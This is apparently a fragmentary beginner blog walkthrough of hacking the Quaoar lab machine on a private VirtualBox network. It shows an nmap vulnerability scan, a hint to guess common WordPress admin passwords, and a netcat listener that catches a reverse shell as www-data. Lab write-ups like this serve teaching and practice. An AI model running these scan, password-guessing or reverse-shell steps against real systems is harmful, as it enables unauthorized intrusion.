...
image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMODUS7uzqGCAYxWuAX1_hgntobG7yXmoqVg&s"
---

> Hi kiddle lets move into hacking world.
{: .prompt-danger }

> This is the most simplest one for beggners
{: .prompt-danger }
...
# Nmap 7.95 scan initiated Mon Jun  9 12:43:16 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV --script vuln -oN scan.txt 192.168.56.114
...
|     	95499236-C9FE-56A6-9D7D-E943A24B633A	5.9	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
|     	54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	5.9	https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	*EXPLOIT*
|     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	5.9	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	*EXPLOIT*
...
|       https://www.securityfocus.com/bid/70574
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
MAC Address: 08:00:27:72:E6:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
# Nmap done at Mon Jun  9 12:44:14 2025 -- 1 IP address (1 host up) scanned in 57.68 seconds
...
just try the common password but i have try to create the custom password using my own tool but it can been used using the other open source tools happy hacking lets move more.
![Screenshot From 2025-06-09 13-26-38](https://github.com/user-attachments/assets/af956b73-17f5-4046-9f5c-10d8834117b7)
...
```
> The gaining the access from the open port for the wp-admin using nc

```
~/Desktop/redteam/hack/Quaora » nc -lnvp 1234                                                     cyberkid@cyberkiddle
listening on [any] 1234 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.114] 37203
bash: no job control in this shell
www-data@Quaoar:/var/www/wordpress/wp-admin$ whoami
whoami
www-data
 ...
 * Documentation:  https://help.ubuntu.com/
  ...
  System information as of Mon Jun  9 10:34:03 EDT 2025

  System load:  0.0               Processes:             121
  Usage of /:   30.0% of 7.21GB   Users logged in:       0
  Memory usage: 40%               IP address for eth0:   192.168.56.114
...
![Screenshot From 2025-06-09 14-34-29](https://github.com/user-attachments/assets/418bbc34-056f-471c-a64c-2443e80e9410)
